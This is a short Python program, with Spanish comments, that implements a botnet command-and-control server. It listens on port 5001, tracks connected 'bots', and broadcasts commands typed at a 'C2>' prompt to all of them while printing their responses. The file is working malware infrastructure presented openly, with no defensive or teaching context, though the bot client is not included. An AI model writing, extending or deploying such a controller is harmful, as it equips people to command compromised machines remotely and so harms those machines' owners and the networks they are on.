import socket
import threading

clients = []
clients_lock = threading.Lock()

def handle_client(client_socket, addr):
    print(f"[+] Nueva conexion de {addr[0]}:{addr[1]}")
    with clients_lock:
        clients.append(client_socket)
    
    try:
        while True:
            # Mantener la conexion abierta para recibir comandos
            data = client_socket.recv(1024)
            if not data:
                break
            # Imprimir respuesta del bot
            print(f"Respuesta de {addr[0]}:\n{data.decode('utf-8', errors='ignore')}")
    except ConnectionResetError:
        print(f"[-] Bot {addr[0]} desconectado.")
    finally:
        with clients_lock:
            clients.remove(client_socket)
        client_socket.close()
        print(f"[-] Conexion con {addr[0]} cerrada.")

def broadcast_command(command):
    with clients_lock:
        print(f"[*] Enviando comando a {len(clients)} bots: {command}")
        for client in clients:
            try:
                client.send(command.encode('utf-8'))
            except socket.error as e:
                print(f"[!] Error enviando a un bot: {e}")


def main():
    host = '0.0.0.0'
    port = 5001

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] C2 escuchando en {host}:{port}")

    # Hilo para aceptar nuevas conexiones
    accept_thread = threading.Thread(target=accept_connections, args=(server,))
    accept_thread.daemon = True
    accept_thread.start()

    # Bucle principal para la shell del C2
    while True:
        command = input("C2> ")
        if command:
            broadcast_command(command)

def accept_connections(server_socket):
    while True:
        client, addr = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client, addr))
        client_handler.daemon = True
        client_handler.start()


if __name__ == "__main__":
    main() 